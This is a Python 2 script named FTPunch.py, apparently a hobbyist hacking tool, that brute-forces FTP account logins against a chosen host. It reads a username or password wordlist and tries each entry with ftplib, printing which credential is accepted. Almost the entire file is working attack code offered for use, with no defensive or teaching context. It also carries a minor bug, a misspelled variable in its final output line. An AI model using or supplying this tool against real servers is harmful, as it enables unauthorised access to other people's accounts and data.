#!/usr/bin/python2
#!/usr/env python2

# Copyright by M-XacT-666
''' Script Kiddie, learn this script and modify with Your own style.
    Do not Paste and Copy it.
    Changing the Variabel and the Author Name didn't make You be a Programmer '''
# Note: ASCII Art is copyrighted to ---
#       visit: https://www.asciiart.eu/weapons/axes

import platform,os,argparse,socket,ftplib
if platform.system() == 'Windows':
	os.system('cls')
else:
	os.system('clear')
def jeda():
	raw_input("Press [ENTER] ")

parser = argparse.ArgumentParser()
parser.add_argument("--target",dest='target',help='Specify Target HOST/IP',type=str)
parser.add_argument("--port",dest='port',help='FTP Port (Def: 21)',type=int,default=21)
parser.add_argument("--mode",dest='mode',help='What to Crack? Username/Password?',type=str,default='passwd')
parser.add_argument("--timeout",dest='timeout',help='Authentication Timeout',type=float,default=0.5)
parser.add_argument("--username",dest='username',help='Used Username to Login',type=str)
parser.add_argument("--password",dest='password',help='Used Password to Login',type=str)
parser.add_argument("--userlist",dest='userlist',help='Specify Wordlist to use (Username)',type=str,default='./wordlist/mxact666_username.txt')
parser.add_argument("--passlist",dest='passlist',help='Specify Wordlist to use (Password)',type=str,default='./wordlist/mxact666_password.txt')
options = parser.parse_args()

if options.target == '' or options.target == 'None' or options.target == None:
	print ""
	print "[!] Error: Target unidentificated! Please check again"
	print "           Your command! learn on 'EXAMPLE.txt'"
	print "           or You can try run 'FTPunch.py --help' command"
	print ""
	jeda()
	exit()

try:
	print ""
	ip_address = socket.gethostbyname(options.target)
except:
	print "[!] Error: Can't find IP Address from {0}".format(options.target)
	print "           check Your connection or check the Host Address!"
	print ""
	jeda()
	exit()

if options.mode == 'passwd' or options.mode == 'Passwd' or options.mode == 'PASSWD':
	mode_retas = 'PASSWORD'
	password_retas = options.passlist
	user_retas = options.username
elif options.mode == 'usernm' or options.mode == 'Usernm' or options.mode == 'USERNM':
	mode_retas = 'USERNAME'
	password_retas = options.password
	user_retas = options.userlist
#elif options.mode == 'both' or options.mode == 'Both' or options.mode == 'BOTH':
#	mode_retas = 'DOBEL'
else:
	print "[!] Error: Unknown Mode: %s" % options.mode
	print "           Check 'README.txt' to see Tutorial/Usage"
	print ""
	jeda()
	exit()

print '''
   .:\      /:.
  [[  \_()_/  ]]
 ||   |    |   ||   FTPunch.py ---> FTP Account
 ||   |    |   ||                   BruteForcer
 ||   |____|   ||   Coded by M-XacT-666 (copyright)
  [[  / || \  ]]
   `:/  ||  \;
        ||
        ||   Target     : {0}
        XX   IP Address : {1}
        XX   FTP's Port : {2}
        XX   Crack Mode : {3}
        XX   Timeout    : {4}
        OO   Username   : {5}
        ##   Password   : {6}
        \/
'''.format(options.target,ip_address,options.port,mode_retas,options.timeout,user_retas,password_retas)

hitung = 0
try:
	if mode_retas == 'PASSWORD':
		try:
			print "[*] Opening and Read Wordlist..."
			isi_wlist = open(options.passlist,'r').readlines()
			print "[+] Wordlist successfully opened and readed!"
		except:
			print "[-] Error: Can't open or read Wordlist! check Location"
			print "           or try again. Wordlist File's is may too big"
			print "           or corrupted"
			print ""
			jeda()
			exit()
		jumlah_kata = str(len(isi_wlist))
		print "[+] Total Word Phrase: %s" % jumlah_kata
		
		print ""
		confirm = raw_input("Confirmation (Y/n) > ")
		if confirm == "n" or confirm == "N" or confirm == "no" or confirm == "NO" or confirm == "No":
			print ""
			print "[-] Cracking Canceled with Confirmation..."
			print ""
			exit()
		else:
			pass
		print ""

		if options.port == 21:
			for kata in isi_wlist:
				hitung += 1
				passkata = kata.strip()
				try:
					core = ftplib.FTP(ip_address,timeout=options.timeout)
					core.login(options.username,passkata)
					core.quit()
					print ""
					print "[ ACCEPTED ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.username,passkata)
					break
				except KeyboardInterrupt:
					print ""
					print "[-] Cracking Canceled with Keyboard Interrupt by User..."
					print ""
					jeda()
					exit()
				except:
					print "[ INVALID ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.username,passkata)
		elif options.port != 21:
			for kata in isi_wlist:
				hitung += 1
				passkata = kata.strip()
				try:
					core = ftplib.FTP()
					core.connect(ip_address,options.port)
					core.login(options.username,passkata)
					core.quit()
					print ""
					print "[ ACCEPTED ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.username,passkata)
					break
				except KeyboardInterrupt:
					print ""
					print "[-] Cracking Canceled with Keyboard Interrupt by User..."
					print ""
					jeda()
					exit()
				except:
					print "[ INVALID ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.username,passkata)
	elif mode_retas == 'USERNAME':
		try:
			print "[*] Opening and Read Wordlist..."
			isi_wlist = open(options.userlist,'r').readlines()
			print "[+] Wordlist successfully opened and readed!"
		except:
			print "[-] Error: Can't open or read Wordlist! check Location"
			print "           or try again. Wordlist File's is may too big"
			print "           or corrupted"
			print ""
			jeda()
			exit()
		jumlah_kata = str(len(isi_wlist))
		print "[+] Total Word Phrase: %s" % jumlah_kata

		print ""
		confirm = raw_input("Confirmation (Y/n) > ")
		if confirm == "n" or confirm == "N" or confirm == "no" or confirm == "NO" or confirm == "No":
			print ""
			print "[-] Cracking Canceled with Confirmation..."
			print ""
			exit()
		else:
			pass
		print ""

		if options.port == 21:
			for kata in isi_wlist:
				hitung += 1
				passkata = kata.strip()
				try:
					core = ftplib.FTP(ip_address,timeout=options.timeout)
					core.login(passkata,options.password)
					core.quit()
					print ""
					print "[ ACCEPTED ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,passkata,options.password)
					break
				except KeyboardInterrupt:
					print ""
					print "[-] Cracking Canceled with Keyboard Interrupt by User..."
					print ""
					jeda()
					exit()
				except:
					print "[ INVALID ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,passkata,options.password)
		elif options.port != 21:
			for kata in isi_wlist:
				hitung += 1
				passkata = kata.strip()
				try:
					core = ftplib.FTP()
					core.connect(ip_address,options.port)
					core.login(passkata,options.password)
					core.quit()
					print ""
					print "[ ACCEPTED ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,passkata,options.password)
					break
				except KeyboardInterrupt:
					print ""
					print "[-] Cracking Canceled with Keyboard Interrupt by User..."
					print ""
					jeda()
					exit()
				except:
					print"[ INVALID ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,passkata,options.passwor)
except:
	print ""
	print "[!] Error: Unknown Error has been occured! Sorry :("
	print ""
	jeda()
	exit()

# Copyright by M-XacT-666
''' Script Kiddie, learn this script and modify with Your own style.
    Do not Paste and Copy it.
    Changing the Variabel and the Author Name didn't make You be a Programmer '''